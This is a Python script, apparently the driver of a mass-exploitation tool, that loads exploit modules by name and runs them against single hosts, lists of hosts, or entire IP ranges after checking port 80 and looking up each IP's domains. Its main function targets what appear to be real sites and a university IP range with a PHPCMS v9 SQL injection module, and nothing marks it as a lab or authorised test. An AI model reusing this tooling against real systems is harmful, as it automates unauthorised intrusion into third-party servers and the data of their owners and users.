#!/usr/bin/python
#-*- coding:utf-8 -*-

'''
Author:	Duke
Description: 
'''

import importlib
from urllib.parse import urlparse
from module.domainip import get_domain
import socket



def single_host_attack(module,host,scheme='http'):
	"""
		- reuturn = {'host': 'http://demo.com','info':'xxx exploit success!'}
	"""
	if not host.startswith('http://') and not host.startswith('https://'):
		host= scheme+"://"+host
	exp_module = importlib.import_module(module)
	info = exp_module.exploit(host)
	msg = {'host':host,'info':info}
	return msg

def multi_host_attack(module,hosts):
	""" hosts: ['http://example.com','http://a.com',..]

		-return = [{'host':'...','info':'...'},{...}]
	"""
	attack_info = []
	for host in hosts:
		info = single_host_attack(module,host)
		attack_info.append(info)
	return attack_info

def single_ip_attack(module,ip):
	"""
		- return = {'ip':'192.168.0.1','IPinfo':[{'host':'...','info':'...'}]}
	"""
	isalive = is_ip_alive(ip)
	if is_ip_alive(ip) == False:
		print('%s is not alive'%ip)
		return '%s is not alive' % ip
	# 识别主机域名
	hosts = get_domain(ip)
	attack_info = {'ip':ip,'IPinfo':[]}
	if len(hosts):
		# 存在主机域名,进行攻击
		for host in hosts:
			msg = single_host_attack(module,host)
			attack_info['IPinfo'].append(msg)
	else:
		return None
	return attack_info

def multi_ip_attack(module,startip,endip):
	""" 指定IP段进行攻击
		- return = [{single_ip_attack()}]
	"""
	# 获取IP段
	ips = ip2num(startip)
	ipe = ip2num(endip)
	iplen = ipe - ips
	attack_info = []
	if iplen < 0:
		return 'IP range is error'
	for i in range(iplen):
		ip = num2ip(ips+i)
		info = single_ip_attack(module,ip)
		if info != None:
			msg = {'ip':ip,'info':info}
			attack_info.append(msg)
		
	return attack_info

def is_ip_alive(ip,port=80):
	""" 检测IP是否存活
	"""
	server = (ip,port)
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.settimeout(1)
	print(server)
	ret = s.connect_ex(server)
	if not ret:
		s.close()
		return True
	else:
		s.close()
		return False

def ip2num(ip):
	num = [int(x) for x in ip.split('.')]
	return num[0] << 24 | num[1] << 16 | num[2] << 8 | num[3]

def num2ip(num):
	ip = ['','','','','']
	ip[3] = (num & 0xff)
	ip[2] = (num & 0xff00) >> 8
	ip[1] = (num & 0xff0000) >> 16
	ip[0] = (num & 0xff000000) >> 24
	return '%s.%s.%s.%s'%(ip[0],ip[1],ip[2],ip[3])

def _get_ip_range_len(startip,endip):
	ips = ip2num(startip)
	ipe = ip2num(endip)

def main():
	target = 'http://2008qm.com'
	targetip = '139.199.158.237'
	host = 'news.cqu.edu.cn'
	ip = '222.198.128.91'
	module = 'exploit.phpcms.phpcms_v9_wap_sql_injection'

	info = multi_ip_attack(module,startip='222.198.128.80',endip='222.198.128.92')
	print(info)


if __name__ == '__main__':
	main()


